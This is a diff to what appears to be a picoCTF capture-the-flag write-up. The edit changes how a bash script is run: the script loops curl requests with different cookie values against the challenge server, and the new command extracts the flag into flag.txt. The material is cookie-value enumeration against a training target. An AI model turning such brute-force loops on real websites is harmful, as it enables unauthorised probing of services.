@@ -30,7 +30,7 @@ Save the script as "cookie.sh"
         curl --cookie "name=$i" "http://mercury.picoctf.net:54219/check"
     done
     
-To run the above script, execute the following in your Linux CLI: `chmod +x cookie.sh && ./cookie.sh | grep pico`
+To run the above script, execute the following in your Linux CLI: `chmod +x cookie.sh && ./cookie.sh | grep -oE "picoCTF{.*}" > flag.txt`
 
 Scroll through the output until you find the flag.
 
